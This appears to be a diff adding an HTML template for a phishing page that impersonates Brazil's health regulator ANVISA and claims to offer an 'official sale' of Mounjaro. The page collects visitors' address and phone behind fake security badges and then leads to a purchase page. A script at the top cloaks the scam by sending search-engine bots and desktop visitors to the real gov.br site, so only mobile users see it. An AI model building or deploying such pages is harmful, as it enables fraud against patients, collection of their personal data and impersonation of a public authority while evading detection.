@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script>
+      // Função para detectar se é um dispositivo móvel
+      function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      }
+
+      // Função para detectar se é um bot
+      function isBot() {
+        const botAgents = [
+          'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+          'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+        ];
+        return botAgents.some(bot => navigator.userAgent.includes(bot));
+      }
+
+      // Função para verificar se a largura da janela é maior que 768px
+      function isWideScreen() {
+        return window.innerWidth > 768;
+      }
+
+      // Redirecionar ou bloquear o acesso
+      function checkAccess() {
+        if (isBot() || (!isMobile() && isWideScreen())) {
+          window.location.href = "https://www.gov.br/anvisa/pt-br"; // Redireciona para ANVISA oficial
+        }
+      }
+
+      // Executar a função de verificação ao carregar a página
+      window.onload = checkAccess;
+
+      // Adicionar listener para verificar novamente ao redimensionar
+      window.addEventListener('resize', checkAccess);
+  </script>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>ANVISA | Venda Oficial do Monjauros</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: italic;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    body {
+      font-family: 'Rawline', sans-serif;
+      background-color: #f8f9fa;
+    }
+    .monjauros-title {
+      font-weight: 700;
+      font-size: 1rem;
+      color: #555;
+      line-height: normal;
+      text-transform: uppercase;
+      text-align: left;
+      margin-bottom: 1rem;
+    }
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    .share-text {
+      font-size: 12px;
+      text-align: center;
+    }
+    .drop-cap::first-letter {
+      float: left;
+      font-size: 4em;
+      line-height: 0.68;
+      font-weight: bold;
+      margin-right: 0.05em;
+      color: #1451B4;
+    }
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 40%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    .light-disc {
+      list-style-type: none;
+    }
+    .light-disc li::before {
+      content: "\2022";
+      color: #BBBBBB;
+      font-weight: bold;
+      display: inline-block;
+      width: 1em;
+      margin-left: -1em;
+    }
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .secure-badge {
+      background-color: #e6f3e6;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 12px;
+      color: #2e7d32;
+      display: inline-flex;
+      align-items: center;
+      margin-right: 8px;
+    }
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    /* Estilos do formulário */
+    .form-container {
+      background-color: white;
+      padding: 24px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+      margin: 20px auto;
+    }
+    .form-header {
+      margin-bottom: 20px;
+    }
+    .form-content {
+      margin-top: 20px;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+    .form-row .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    .form-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #444;
+      margin-bottom: 8px;
+    }
+    .form-input, select.form-input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      font-family: 'Rawline', sans-serif;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+    }
+    .form-input:focus, select.form-input:focus {
+      border-color: #1351b4;
+      box-shadow: inset 0 1px 3px rgba(19, 81, 180, 0.2);
+      outline: none;
+    }
+    .input-icon-wrapper {
+      position: relative;
+    }
+    .input-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #999;
+    }
+    .with-icon {
+      padding-left: 38px;
+    }
+    .loader {
+      display: none;
+      width: 20px;
+      height: 20px;
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #1451B4;
+      border-radius: 50%;
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: translateY(-50%) rotate(0deg); }
+      100% { transform: translateY(-50%) rotate(360deg); }
+    }
+    .error-message {
+      display: none;
+      color: #e53935;
+      font-size: 13px;
+      margin-top: 5px;
+    }
+    .btn {
+      padding: 12px 25px;
+      border-radius: 30px;
+      font-weight: 600;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.3s ease;
+      cursor: pointer;
+      border: none;
+    }
+    .btn i {
+      margin-right: 8px;
+    }
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+    }
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+  </style>
+</head>
+<body class="bg-[#f8f9fa]">
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Cadastro de Endereço</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Cadastro de Endereço
+      </h2>
+      <p class="subtitle">
+        Informe seu endereço para envio do Mounjaro
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+    </div>
+    
+    <div class="form-container">
+      <div class="form-header">
+        <h3 class="text-lg font-semibold text-[#0c326f]">Dados de Entrega</h3>
+        <p class="text-sm text-gray-600">Preencha para receber o Mounjaro em sua residência</p>
+      </div>
+      
+      <div class="form-content">
+        <form id="addressForm" action="/compra" method="post">
+          
+          <div class="form-group">
+            <label for="cep" class="form-label">CEP</label>
+            <div class="input-icon-wrapper">
+              <i class="fas fa-map-marker-alt input-icon"></i>
+              <input type="text" id="cep" name="cep" class="form-input with-icon" placeholder="Digite o CEP" maxlength="9" required>
+              <div id="cepLoader" class="loader"></div>
+              <span id="errorCep" class="error-message">CEP inválido</span>
+            </div>
+          </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label for="street" class="form-label">Logradouro</label>
+              <input type="text" id="street" name="street" class="form-input" placeholder="Ex: Rua, Avenida, etc." required>
+            </div>
+            
+            <div class="form-group" style="flex: 0.3;">
+              <label for="number" class="form-label">Número</label>
+              <input type="text" id="number" name="number" class="form-input" placeholder="Nº">
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label for="complement" class="form-label">Complemento</label>
+            <input type="text" id="complement" name="complement" class="form-input" placeholder="Ex: Apartamento, bloco, etc.">
+          </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label for="neighborhood" class="form-label">Bairro</label>
+              <input type="text" id="neighborhood" name="neighborhood" class="form-input" placeholder="Bairro" required>
+            </div>
+            
+            <div class="form-group">
+              <label for="city" class="form-label">Cidade</label>
+              <input type="text" id="city" name="city" class="form-input" placeholder="Cidade" required>
+            </div>
+          </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label for="state" class="form-label">Estado</label>
+              <select id="state" name="state" class="form-input" required>
+                <option value="" selected disabled>Selecione</option>
+                <option value="AC">Acre</option>
+                <option value="AL">Alagoas</option>
+                <option value="AP">Amapá</option>
+                <option value="AM">Amazonas</option>
+                <option value="BA">Bahia</option>
+                <option value="CE">Ceará</option>
+                <option value="DF">Distrito Federal</option>
+                <option value="ES">Espírito Santo</option>
+                <option value="GO">Goiás</option>
+                <option value="MA">Maranhão</option>
+                <option value="MT">Mato Grosso</option>
+                <option value="MS">Mato Grosso do Sul</option>
+                <option value="MG">Minas Gerais</option>
+                <option value="PA">Pará</option>
+                <option value="PB">Paraíba</option>
+                <option value="PR">Paraná</option>
+                <option value="PE">Pernambuco</option>
+                <option value="PI">Piauí</option>
+                <option value="RJ">Rio de Janeiro</option>
+                <option value="RN">Rio Grande do Norte</option>
+                <option value="RS">Rio Grande do Sul</option>
+                <option value="RO">Rondônia</option>
+                <option value="RR">Roraima</option>
+                <option value="SC">Santa Catarina</option>
+                <option value="SP">São Paulo</option>
+                <option value="SE">Sergipe</option>
+                <option value="TO">Tocantins</option>
+              </select>
+            </div>
+            
+            <div class="form-group">
+              <label for="phone" class="form-label">Telefone para contato</label>
+              <div class="input-icon-wrapper">
+                <i class="fas fa-phone input-icon"></i>
+                <input type="tel" id="phone" name="phone" class="form-input with-icon" placeholder="(XX) XXXXX-XXXX" required>
+              </div>
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label for="reference" class="form-label">Ponto de referência (opcional)</label>
+            <input type="text" id="reference" name="reference" class="form-input" placeholder="Ex: Próximo ao supermercado...">
+          </div>
+          
+          <div class="form-group mb-6">
+            <label class="flex items-center gap-2 cursor-pointer">
+              <input type="checkbox" id="terms" name="terms" required class="w-4 h-4 accent-[#1351b4]">
+              <span class="text-sm text-gray-600">
+                Concordo com os <a href="#" class="text-[#1351b4] underline">termos de envio</a> e autorizo o uso dos meus dados para entrega
+              </span>
+            </label>
+          </div>
+          
+          <div class="text-center">
+            <button type="submit" class="btn btn-primary w-full md:w-2/3">
+              <i class="fas fa-check-circle"></i> Prosseguir para detalhes do produto
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+    
+    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
+      <p class="font-bold text-gray-700 text-base mb-2">
+        <i class="fas fa-shield-alt text-green-600 mr-2"></i>
+        Seus Dados Estão Protegidos
+      </p>
+      <p class="text-gray-700 text-sm">
+        Todas as informações são criptografadas e armazenadas com segurança. Utilizamos seus dados apenas para entrega do produto, em conformidade com a Lei Geral de Proteção de Dados (LGPD).
+      </p>
+    </div>
+  </main>
+  <div class="w-full">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    // Máscara para o campo de CEP
+    document.getElementById('cep').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 5) {
+        value = value.substring(0, 5) + '-' + value.substring(5, 8);
+      }
+      e.target.value = value;
+    });
+    
+    // Máscara para o campo de telefone
+    document.getElementById('phone').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      
+      if (value.length <= 10) {
+        // Formato (XX) XXXX-XXXX
+        if (value.length > 2) {
+          value = '(' + value.substring(0, 2) + ') ' + value.substring(2);
+        }
+        if (value.length > 9) {
+          value = value.substring(0, 9) + '-' + value.substring(9);
+        }
+      } else {
+        // Formato (XX) XXXXX-XXXX para celular
+        if (value.length > 2) {
+          value = '(' + value.substring(0, 2) + ') ' + value.substring(2);
+        }
+        if (value.length > 10) {
+          value = value.substring(0, 10) + '-' + value.substring(10, 15);
+        }
+      }
+      
+      e.target.value = value;
+    });
+    
+    // Consulta de CEP via ViaCEP
+    document.getElementById('cep').addEventListener('blur', function() {
+      const cep = this.value.replace(/\D/g, '');
+      
+      if (cep.length !== 8) {
+        document.getElementById('errorCep').style.display = 'block';
+        return;
+      }
+      
+      document.getElementById('errorCep').style.display = 'none';
+      document.getElementById('cepLoader').style.display = 'inline-block';
+      
+      fetch(`https://viacep.com.br/ws/${cep}/json/`)
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById('cepLoader').style.display = 'none';
+          
+          if (data.erro) {
+            document.getElementById('errorCep').style.display = 'block';
+            return;
+          }
+          
+          document.getElementById('street').value = data.logradouro;
+          document.getElementById('neighborhood').value = data.bairro;
+          document.getElementById('city').value = data.localidade;
+          document.getElementById('state').value = data.uf;
+          
+          // Focar no campo de número após preencher o endereço
+          document.getElementById('number').focus();
+        })
+        .catch(error => {
+          document.getElementById('cepLoader').style.display = 'none';
+          document.getElementById('errorCep').style.display = 'block';
+          console.error('Erro ao consultar CEP:', error);
+        });
+    });
+    
+    // Armazenar as respostas do questionário para uso na página de compra
+    function storeFormData() {
+      const form = document.getElementById('addressForm');
+      const formData = new FormData(form);
+      
+      // Converter FormData para objeto
+      const formDataObject = {};
+      formData.forEach((value, key) => {
+        formDataObject[key] = value;
+      });
+      
+      // Armazenar no localStorage para uso na página de compra
+      localStorage.setItem('addressData', JSON.stringify(formDataObject));
+      
+      // Permitir envio do formulário
+      return true;
+    }
+    
+    // Adicionar evento de envio ao formulário
+    document.getElementById('addressForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      // Validar formulário
+      const form = this;
+      if (!form.checkValidity()) {
+        form.reportValidity();
+        return;
+      }
+      
+      // Armazenar dados e redirecionar
+      storeFormData();
+      window.location.href = '/compra';
+    });
+    
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
